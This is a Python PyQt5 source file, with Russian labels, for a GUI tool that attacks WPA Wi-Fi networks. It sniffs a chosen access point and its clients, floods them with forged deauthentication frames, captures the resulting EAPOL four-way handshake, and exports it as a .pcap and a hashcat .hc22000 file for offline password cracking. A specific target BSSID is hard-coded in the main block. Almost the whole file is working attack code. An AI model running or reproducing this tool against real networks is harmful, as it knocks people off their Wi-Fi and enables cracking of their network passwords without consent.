#!/usr/bin/env python3

from PyQt5.QtWidgets import (
	QApplication, QTreeView, QVBoxLayout, QHBoxLayout, QWidget, QHeaderView, QPushButton, QLabel, QProgressBar, 
	QStyledItemDelegate, QStyleOptionProgressBar, QStyle, QComboBox, QSizePolicy, QMessageBox, QDialog, QTextEdit, QFileDialog,
	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QDoubleSpinBox, QCheckBox, QLayout
)
from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QPainter, QColor, QPen, QPainterPath, QFont, QKeyEvent
from PyQt5.QtCore import Qt, QEvent, QSize, QTimer, QObject, QMetaObject, Q_ARG, pyqtSlot, QRect, QTimer

import sys
import csv
import threading
import subprocess
import signal
import json
import pcapy
import shutil

from scapy.all import *
from misc import WiFiInject, WiFiPhyManager, WiFi_Parser, VendorOUI

def scale_rssi(rssi_value, min_rssi=-90, max_rssi=-40, new_min=0, new_max=100):
    return max(new_min, min(new_max, (rssi_value - min_rssi) * (new_max - new_min) / (max_rssi - min_rssi) + new_min))

class StylesDeligate(QStyledItemDelegate):
	def __init__(self, parent=None, main_class=None):
		super().__init__(parent)
		self.main_class = main_class

	def initStyleOption(self, option, index):
		super().initStyleOption(option, index)
		if index.column() == 0:
			option.font = QFont("Courier New", 10)


	def paint(self, painter, option, index):
		model = index.model()
		mac = index.data(Qt.UserRole)
		
		flags = self.main_class.stations[mac]['flags']
		all_need_flags = all(M in flags for M in ['M1', 'M2', 'M3', 'M4'])

		if index.column() == 0 and all_need_flags:
			text = index.data(Qt.DisplayRole)
			painter.save()

			icon = index.data(Qt.DecorationRole)
			icon_size = option.decorationSize.width() if icon else 0
			padding = 5
			text_x = option.rect.x() + icon_size + (padding if icon else 0)
			text_y = option.rect.y() + 2
			font_bold = QFont()

			font_metrics = painter.fontMetrics()
			line_height = font_metrics.height()

			if icon:
				icon_rect = QRect(option.rect.x() +3, option.rect.y() +3, icon_size, icon_size)
				icon.paint(painter, icon_rect, Qt.AlignVCenter)
			
			font = QFont()
			font.setBold(True)
			font.setUnderline(True)
			painter.setFont(font)
			painter.setPen(QColor('#ff0000'))
			painter.drawText(text_x, text_y-1, option.rect.width() - text_x, line_height, Qt.AlignLeft | Qt.AlignTop, text)
			font.setUnderline(False)
			font.setBold(False)
			font.setItalic(True)
			painter.setFont(font)
			painter.setPen(QColor(Qt.gray))
			painter.drawText(text_x +15, text_y + line_height, option.rect.width() - text_x, line_height, Qt.AlignLeft | Qt.AlignTop, "(EAPOL)")

			eapol_icon = QIcon('icons/key.png')
			eapol_icon_rect = QRect(option.rect.x() + icon_size, option.rect.y() + line_height +5, 16, 16)
			eapol_icon.paint(painter, eapol_icon_rect, Qt.AlignVCenter)

			painter.restore()
		else:
			super().paint(painter, option, index)

class ProgressBarDelegate(QStyledItemDelegate):
	def __init__(self, parent=None):
		super().__init__(parent)

	def paint(self, painter, option, index):
		if 1:
			try:
				rssi_value = int(index.data())
			except ValueError:
				return
		
			signal_strength = int(scale_rssi(rssi_value, -85, -40, 0, 100))
			padding = 6
			bar_rect = option.rect.adjusted(padding, padding, -padding, -padding)

			if option.state & QStyle.State_Selected:
				painter.fillRect(option.rect, option.palette.highlight())

			progress_option = QStyleOptionProgressBar()
			progress_option.rect = bar_rect
			progress_option.minimum = 0
			progress_option.maximum = 100
			progress_option.progress = signal_strength
			progress_option.text = f"{rssi_value} dBm"
			progress_option.textVisible = True
			progress_option.textAlignment = Qt.AlignCenter

			painter.save()
			painter.setRenderHint(QPainter.Antialiasing)
			option.widget.style().drawControl(QStyle.CE_ProgressBar, progress_option, painter)
			painter.restore()
		else:
			super().paint(painter, option, index)

	def createEditor(self, parent, option, index):
		return None

class DeauthDialog(QDialog):

	def handle_interrupt(self, signum, frame):
		self.interrupt_flag = True
		self.close()
	
	def closeEvent(self, event: QEvent):
		self.interrupt_flag = True
		self.stations = {}
		event.accept()

	def __init__(self, interface, bssid, channel, parent=None):
		super().__init__(parent)

		signal.signal(signal.SIGINT, self.handle_interrupt)
		
		self.interface = interface
		self.bssid = bssid
		self.channel = channel
		self.vendor_oui = VendorOUI()
		self.stations = {}
		self.client = None
		self.ssid = None

		self.packets = []
		self.interrupt_flag = False
		self.recv_beacon_flag = False
		self.beacons = 0
		self.key_m1_cnt = 0
		self.key_m2_cnt = 0
		self.key_m3_cnt = 0
		self.key_m4_cnt = 0

		self.deauth_reasons = {
			1: "Unspecified reason",
			2: "Previous authentication no longer valid",
			3: "Deauthenticated because sending station is leaving (or has left) IBSS or ESS",
			4: "Disassociated due to inactivity",
			5: "Disassociated because AP is unable to handle all currently associated stations",
			6: "Class 2 frame received from nonauthenticated station",
			7: "Class 3 frame received from nonassociated station",
			8: "Disassociated because sending station is leaving (or has left) BSS",
			9: "Station requesting (re)association is not authenticated with responding station",
			34: "Deauthenticated because of 802.1X authentication failed"
		}

		self.init_ui()
		self.wifiman = WiFiPhyManager()

		self.stop_button.setEnabled(False)
		self.deauth_button.setEnabled(False)
		self.save_pcap_button.setEnabled(False)

		if not self.wifiman.iface_exists(interface):
			self.log(f'[!] Interface {interface} does not exist!')
			self.update_status_label(self.interface_label, 'Interface', '-')
			self.start_button.setEnabled(False)
			return

		self.log(f'[+] Target: {self.vendor_oui.get_mac_vendor_mixed(self.bssid)}')
		self.channel_timer = QTimer()
		self.channel_timer.setInterval(1000)
		self.channel_timer.timeout.connect(self.channel_timer_timeout)
		self.channel_timer.start()
	
	def channel_timer_timeout(self):
		self.wifiman.switch_iface_channel(self.interface, self.channel)		

	def init_ui(self):
		# --- ЦЕНТРУЕМ ОКНО ---
		self.setGeometry(*self.center_window(1200, 600))

		# --- ВЕРХНИЙ БЛОК: Две колонки ---
		top_layout = QHBoxLayout()

		# Левая колонка (Статус)
		status_layout = QVBoxLayout()
		self.interface_label = self.create_status_label('Interface', self.interface)
		self.ssid_label = self.create_status_label('SSID', '-')
		self.bssid_label = self.create_status_label('BSSID', self.vendor_oui.get_mac_vendor_mixed(self.bssid))
		self.channel_label = self.create_status_label('Channel', self.channel)
		self.beacons_label = self.create_status_label('Beacons', 0)
		self.packets_label = self.create_status_label('Packets', 0)
		rssi_progress_layout, self.rssi_progress = self.create_progress_bar('RSSI', -90, -30, -90, "- dBm")

		status_layout.addWidget(self.interface_label)
		status_layout.addWidget(self.ssid_label)
		status_layout.addWidget(self.bssid_label)
		status_layout.addWidget(self.channel_label)
		status_layout.addWidget(self.beacons_label)
		status_layout.addWidget(self.packets_label)
		status_layout.addLayout(rssi_progress_layout)

		# Правая колонка (Настройки)
		settings_layout = QVBoxLayout()
		deauth_packets_layout, self.deauth_packets_edit = self.create_spinbox("Пакетов деавторизации за раз", 1, 500, 127)
		deauth_attempts_layout, self.deauth_attempts_edit = self.create_spinbox("Попыток деавторизации", 1, 100, 3)
		deauth_timeout_layout, self.deauth_timeout_edit = self.create_spinbox("Время между посылками деавторизации", 1, 10, 1, "сек")
		deauth_reason_layout, self.deauth_reason_select = self.create_combobox("Причина деавторизации", self.deauth_reasons, 3)
		hc22000_layout, self.hc22000_checkbox = self.create_checkbox('Создать .hc22000 файл для hashcat (требуется hcxpcapngtool)', True, bool(shutil.which('hcxpcapngtool')))

		settings_layout.addLayout(deauth_packets_layout)
		settings_layout.addLayout(deauth_attempts_layout)
		settings_layout.addLayout(deauth_timeout_layout)
		settings_layout.addLayout(deauth_reason_layout)
		settings_layout.addLayout(hc22000_layout)


		# Добавляем две колонки в верхний блок
		top_layout.addLayout(status_layout, 2)  # Даем статусу больше места
		top_layout.addLayout(settings_layout, 1)  # Настройки чуть уже

		# Фиксируем размер верхнего блока, чтобы он не тянулся вниз
		top_layout.setSizeConstraint(QLayout.SetFixedSize)

		# --- СРЕДНИЙ БЛОК: Кнопки ---
		buttons_layout = QHBoxLayout()
		self.start_button = self.create_button('Начать сканирование', 'icons/refresh', self.start_scan_thread)
		self.stop_button = self.create_button('Стоп', 'icons/cancelled.png', self.stop_scan_thread)
		self.deauth_button = self.create_button('Деавторизовать', 'icons/unlocked.png', self.start_deauth)
		self.save_pcap_button = self.create_button('Сохранить в .pcap', 'icons/diskette.png', self.save_pcap)

		buttons_layout.addWidget(self.start_button)
		buttons_layout.addWidget(self.stop_button)
		buttons_layout.addWidget(self.deauth_button)
		buttons_layout.addWidget(self.save_pcap_button)
		buttons_layout.addStretch()

		# --- НИЖНИЙ БЛОК: Таблица ---
		self.stations_table = QTableView(self)
		self.stations_table_model = QStandardItemModel(0, 5, self)
		self.stations_table_model.setHorizontalHeaderLabels(['MAC', 'RSSI', 'Frames', 'ACKs', 'Rate', 'Modulation', 'Flags'])

		self.stations_table.setModel(self.stations_table_model)
		self.stations_table.horizontalHeader().setStretchLastSection(True)
		self.stations_table.setEditTriggers(QTableView.NoEditTriggers)
		self.stations_table.setShowGrid(False)
		self.stations_table.verticalHeader().setVisible(False)
		self.stations_table.setSelectionBehavior(QTableView.SelectionBehavior.SelectRows)
		self.stations_table.setIconSize(QSize(32, 32))
		self.stations_table.setItemDelegateForColumn(1, ProgressBarDelegate(self.stations_table))
		self.stations_table.setItemDelegateForColumn(0, StylesDeligate(self.stations_table, self))

		# --- Рзамеры колонок в таблице ---
		self.stations_table.setColumnWidth(0, 200)
		self.stations_table.setColumnWidth(1, 420)
		self.stations_table.setColumnWidth(3, 55)
		self.stations_table.setColumnWidth(4, 80)
		self.stations_table.setColumnWidth(5, 180)

		# Указываем, что таблица должна занимать оставшееся место
		self.stations_table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)

		# --- ЛОГ ---
		self.log_textarea = QTextEdit()
		self.log_textarea.setFont(QFont("Courier New", 11))
		self.log_textarea.setReadOnly(True)

		# --- ОБЪЕДИНЯЕМ ВСЁ В ГЛАВНЫЙ ЛЭЙАУТ ---
		main_layout = QVBoxLayout()
		main_layout.addLayout(top_layout)
		main_layout.addLayout(buttons_layout)
		main_layout.addWidget(self.stations_table)  # Добавляем таблицу
		main_layout.addWidget(self.log_textarea) # Добавляем лог

		self.setLayout(main_layout)
	
	def start_scan_thread(self):
		self.interrupt_flag = False
		self.stop_button.setEnabled(True)
		self.start_button.setEnabled(False)
		
		self.log(f'[+] Switching {self.interface} to channel {self.channel}')
		self.wifiman.switch_iface_channel(self.interface, self.channel)
		threading.Thread(target=self.start_monitoring).start()
		self.log(f'[+] Waiting beacon frame from {self.vendor_oui.get_mac_vendor_mixed(self.bssid)}')

	def start_monitoring(self):
		sniff(iface=self.interface, prn=self.packet_handler, stop_filter=lambda pkt: (self.interrupt_flag))
	
	def stop_scan_thread(self):
		self.interrupt_flag = True
		self.stop_button.setEnabled(False)
		self.start_button.setEnabled(True)
		self.deauth_button.setEnabled(False)
		
	def start_deauth(self):
		selected_indexes = self.stations_table.selectionModel().selectedRows()
		if selected_indexes:
			row = selected_indexes[0].row()
			model = self.stations_table.model()
			self.client = model.data(model.index(row, 0), Qt.UserRole)
			#self.CLIENT = self.client.upper()
		else:
			self.client = None
			#self.CLIENT = None
		threading.Thread(target=self.send_deauth).start()

	def safe_log(self, log):
		QMetaObject.invokeMethod(self, "log", Qt.QueuedConnection, Q_ARG(str, log))

	@pyqtSlot(str)
	def log(self, log):
		self.log_textarea.append(log)
		self.log_textarea.moveCursor(self.log_textarea.textCursor().End)

	def center_window(self, w, h):
		output = subprocess.check_output("xrandr | grep '*' | awk '{print $1}'", shell=True).decode()
		wh = list(map(int, output.split('x')))
		return (wh[0] // 2 - w // 2, wh[1] // 2 - h // 2, w, h)

	def create_button(self, label, icon, onclick=None):
		button = QPushButton()
		button.setText(label)
		button.setIcon(QIcon(icon))
		button.setIconSize(QSize(24, 24))
		
		if not onclick is None: 
			button.clicked.connect(onclick)

		return button

	def create_checkbox(self, label, checked=True, enabled=True):
		layout = QHBoxLayout()
		checkbox = QCheckBox()
		checkbox.setText(label)
		checkbox.setChecked(checked)
		checkbox.setEnabled(enabled)
		layout.addWidget(checkbox)
		layout.addStretch()

		return layout, checkbox

	def create_spinbox(self, label, min_val, max_val, default, suffix=''):
		layout = QHBoxLayout()
		spinbox = QSpinBox()
		spinbox.setRange(min_val, max_val)
		spinbox.setValue(default)
		layout.addWidget(QLabel(label))
		layout.addWidget(spinbox)
		if suffix:
			layout.addWidget(QLabel(suffix))
		layout.addStretch()

		return layout, spinbox
	
	def create_combobox(self, label, items, selected=None):
		layout = QHBoxLayout()
		layout.addWidget(QLabel(label))
		combobox = QComboBox()

		for key, val in items.items():
			combobox.addItem(f'{key}: {val}', key)

		if not selected is None:
			index = combobox.findData(selected) 
			if index != -1:
				combobox.setCurrentIndex(index)

		layout.addWidget(combobox)
		layout.addStretch()

		return layout, combobox
	
	def create_status_label(self, key, val):
		return QLabel(f'<b>{key}</b>: {val}') 
	
	def safe_update_status_label(self, qLabel, item, val):
		QMetaObject.invokeMethod(self, "__update_status_label", Qt.QueuedConnection, Q_ARG(QObject, qLabel), Q_ARG(str, str(item)), Q_ARG(str, str(val)))

	@pyqtSlot(QObject, str, str)
	def __update_status_label(self, obj, item, val):
		if isinstance(obj, QLabel):
			obj.setText(f'<b>{item}</b>: {val}')

	def update_status_label(self, qLabel, item, val):
		qLabel.setText(f"<b>{item}: </b>{val}")


	def safe_update_ap_rssi(self, rssi):
		QMetaObject.invokeMethod(self, "_update_ap_rssi", Qt.QueuedConnection, Q_ARG(int, rssi))

	@pyqtSlot(int)
	def _update_ap_rssi(self, rssi):
		self.rssi_progress.setFormat(f"{rssi} dBm")
		self.rssi_progress.setValue(rssi)

	def safe_add_station(self, json_data):
		QMetaObject.invokeMethod(self, "__add_station", Qt.QueuedConnection, Q_ARG(str, str(json_data)))	

	@pyqtSlot(str)
	def __add_station(self, json_data):
		data = json.loads(json_data)
		
		for mac, st_dict in data.items():
			row = []

			item = QStandardItem(QIcon('icons/signal.png'), str(st_dict.get('mixed', '-')))
			item.setData(mac, Qt.UserRole)

			row.append(item)
			row.append(QStandardItem(str(st_dict.get('signal', '-'))))
			row.append(QStandardItem(str(st_dict.get('frames', '-'))))
			row.append(QStandardItem(str(st_dict.get('acks', '-'))))
			row.append(QStandardItem(str(st_dict.get('rate', '-'))))
			row.append(QStandardItem(str(st_dict.get('modulation', '-'))))
			row.append(QStandardItem(str(st_dict.get('flags_str', '-'))))

		self.stations_table_model.appendRow(row)
		model = self.stations_table_model
		model.dataChanged.emit(model.index(0, 0), model.index(model.rowCount() - 1, model.columnCount() - 1))
		row_number = self.stations_table_model.rowCount() -1
		if row_number >= 0:
			self.stations_table.setRowHeight(row_number, 40)

	def safe_update_item_by_mac(self, mac, item, data):
		QMetaObject.invokeMethod(self, "_update_item_by_mac", Qt.QueuedConnection, Q_ARG(str, mac), Q_ARG(int, item), Q_ARG(str, data))

	@pyqtSlot(str, int, str)
	def _update_item_by_mac(self, mac, column, data):
		for row in range(self.stations_table_model.rowCount()):
			item_mac = self.stations_table_model.item(row, 0)
			if item_mac and item_mac.data(Qt.UserRole) == mac:
				item = self.stations_table_model.item(row, column) 
				if item:
					item.setText(str(data))
		model = self.stations_table_model
		model.dataChanged.emit(model.index(0, 0), model.index(model.rowCount() - 1, model.columnCount() - 1))
		self.stations_table.update()


	def create_progress_bar(self, label, min, max, progress, format):
		layout = QHBoxLayout()
		layout.addWidget(QLabel(f'<b>{label}</b>: '))
		progressbar = QProgressBar()		
		progressbar.setMinimum(min)
		progressbar.setMaximum(max)
		progressbar.setValue(progress)
		progressbar.setFormat(format)
		layout.addWidget(progressbar)
		#layout.addStretch()

		return layout, progressbar
	
	def packet_handler(self, pkt):
		if pkt.haslayer(RadioTap):
			wifi = WiFi_Parser(pkt)
			st_mac = pkt.addr1

			if pkt.type == 1 and pkt.subtype == 13:
				if st_mac in self.stations:
					self.stations[st_mac]['acks'] += 1

			if pkt.haslayer(Dot11Beacon):
				bssid = pkt.addr3
				if bssid == self.bssid.lower():
					if not self.recv_beacon_flag:
						self.recv_beacon_flag = True
						self.ssid = wifi.ssid()
						self.safe_log(f'[+] Done, ESSID="{wifi.ssid()}"')
						self.deauth_button.setEnabled(True)
						self.save_pcap_button.setEnabled(True)
						self.packets.append(pkt)
						self.safe_update_status_label(self.ssid_label, 'SSID', wifi.ssid())
						self.safe_update_status_label(self.packets_label, 'Packets', len(self.packets))
					self.beacons += 1
					self.safe_update_status_label(self.beacons_label, 'Beacons', self.beacons)
					self.safe_update_ap_rssi(wifi.RadioTap_Attr('dBm_AntSignal'))
			
			ap_mac = pkt.addr1
			st_mac = pkt.addr2

			# Честно, я с этим пиздец как заебался, но работает норм :))))
			if ((ap_mac == self.bssid) and (pkt.type == 1 and pkt.subtype in [8, 9])):
				if not st_mac in self.stations:
					self.safe_log(f'[+] Found station {self.vendor_oui.get_mac_vendor_mixed(st_mac)}')
					self.stations[st_mac] = {
						'mac': st_mac,
						'mixed': self.vendor_oui.get_mac_vendor_mixed(st_mac),
						'signal': wifi.RadioTap_Attr('dBm_AntSignal'),
						'frames': 1,
						'acks': 0,
						'rate': f"{wifi.RadioTap_Attr('Rate')} mB/s",
						'modulation': str(wifi.RadioTap_Attr('ChannelFlags')),
						'flags': [],
						'flags_str': '-'
					}

					stations_json = json.dumps(self.stations, default=str)
					self.safe_add_station(stations_json)
				else:
					self.stations[st_mac]['frames'] += 1
					self.stations[st_mac]['signal'] = wifi.RadioTap_Attr('dBm_AntSignal')
					self.stations[st_mac]['rate'] = f"{wifi.RadioTap_Attr('Rate')} mB/s"
					self.stations[st_mac]['modulation'] = str(wifi.RadioTap_Attr('ChannelFlags'))

					self.safe_update_item_by_mac(st_mac, 1, str(self.stations[st_mac]['signal']))
					self.safe_update_item_by_mac(st_mac, 2, str(self.stations[st_mac]['frames']))
					self.safe_update_item_by_mac(st_mac, 3, str(self.stations[st_mac]['acks']))
					self.safe_update_item_by_mac(st_mac, 4, str(self.stations[st_mac]['rate']))
					self.safe_update_item_by_mac(st_mac, 5, str(self.stations[st_mac]['modulation']))

		if pkt.haslayer(Dot11):
			if pkt.type == 0 and pkt.subtype in [2, 12]:
				d_st_mac = pkt.addr1 if pkt.addr1 in self.stations else (pkt.addr2 if pkt.addr2 in self.stations else None)

				if d_st_mac in self.stations:
					if 'D' not in self.stations[d_st_mac]['flags'] and pkt.subtype == 12:
						self.stations[d_st_mac]['flags'].append('D')
						self.safe_update_item_by_mac(d_st_mac, 6, ' '.join(self.stations[d_st_mac]['flags']))
					if 'R' not in self.stations[d_st_mac]['flags'] and pkt.subtype == 2:
						self.stations[d_st_mac]['flags'].append('R')
						self.safe_update_item_by_mac(d_st_mac, 6, ' '.join(self.stations[d_st_mac]['flags']))

		if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and pkt.addr3 == self.bssid:
			raw_data = bytes(pkt[EAPOL])
			key_info = int.from_bytes(raw_data[5:7], 'big')
			eapol_st = pkt.addr1 if pkt.addr1 in self.stations else (pkt.addr2 if pkt.addr2 in self.stations else None)

			if eapol_st:
				if eapol_st in self.stations:
					if key_info == 0x008a:
						self.key_m1_cnt += 1
						self.safe_log(f"[+] Received M1 Message from \"{self.vendor_oui.get_mac_vendor_mixed(self.bssid)}\"")
						if 'M1' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M1')
						self.packets.append(pkt)
					elif key_info == 0x010a:
						self.key_m2_cnt += 1
						self.safe_log(f"[+] Received M2 Message from \"{self.vendor_oui.get_mac_vendor_mixed(eapol_st)}\"")
						if 'M2' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M2')
						self.packets.append(pkt)
					elif key_info == 0x13ca:
						self.key_m3_cnt += 1
						self.safe_log(f"[+] Received M3 Message from \"{self.vendor_oui.get_mac_vendor_mixed(self.bssid)}\"")
						if 'M3' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M3')
						self.packets.append(pkt)
					elif key_info == 0x030a:
						self.key_m4_cnt += 1
						self.safe_log(f"[+] Received M4 Message from \"{self.vendor_oui.get_mac_vendor_mixed(eapol_st)}\"")
						if 'M4' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M4')
						self.packets.append(pkt)

					self.safe_update_status_label(self.packets_label, 'Packets', len(self.packets))
					self.safe_update_item_by_mac(eapol_st, 6, ' '.join(self.stations[eapol_st]['flags']))

			

	def deauth_log_callback(self, attempt, count, bssid, client, reason_code):
		bssid = self.vendor_oui.get_mac_vendor_mixed(bssid)
		client = self.vendor_oui.get_mac_vendor_mixed(client)
		if client != 'FF:FF:FF:FF:FF:FF':
			self.safe_log(f"[+] Sending direct deauth as {client} to {bssid} (reason={reason_code}) ({attempt} of {count})")
		else:
			self.safe_log(f"[+] Sending direct deauth to broadcast as {bssid} (reason={reason_code}) ({attempt} of {count})")

	def send_deauth(self):
		self.deauth_button.setEnabled(False)
		pcap = pcapy.open_live(self.interface, 100, 1, 9)
		reason_code_index = self.deauth_reason_select.currentIndex()
		reason_code = self.deauth_reason_select.itemData(reason_code_index)
		deauth_attempts = self.deauth_attempts_edit.value()
		deauth_packets = self.deauth_packets_edit.value()
		deauth_timeout = self.deauth_timeout_edit.value()

		wifi_inject = WiFiInject(self.interface, self.bssid, self.client)
		wifi_inject.deauth(reason_code, deauth_attempts, deauth_packets, deauth_timeout, self.deauth_log_callback)
		self.deauth_button.setEnabled(True)

	def save_pcap(self):
		if len(self.packets) > 0:
			if self.key_m1_cnt == 0 or self.key_m2_cnt == 0 or self.key_m3_cnt == 0 or self.key_m4_cnt == 0:
				QMessageBox.warning(self, "Предупреждение!", "Не собраны или отсуствует часть ключей M1-M4")
			options = QFileDialog.Options()
			file_path, _ = QFileDialog.getSaveFileName(self, "Сохранить как", f"{self.ssid}.pcap", "PCAP Files (*.pcap)", options=options)
			if file_path:
				try:
					wrpcap(file_path, self.packets)
					if self.hc22000_checkbox.isChecked():
						directory = os.path.dirname(file_path)
						subprocess.run(['hcxpcapngtool', '-o', f"{directory}/{self.ssid}.hc22000", file_path], capture_output=True, text=True)
				except Exception as e:
					print(e)
		else:
			QMessageBox.critical(self, "Ошибка", f"Отсутсвуют данные от {self.vendor_oui.get_mac_vendor_mixed(self.bssid)}")

if __name__ == '__main__':
	app = QApplication(sys.argv)
	window = DeauthDialog('radio0mon', 'a8:63:7d:e3:01:12', 13)
	window.show()
	sys.exit(app.exec_())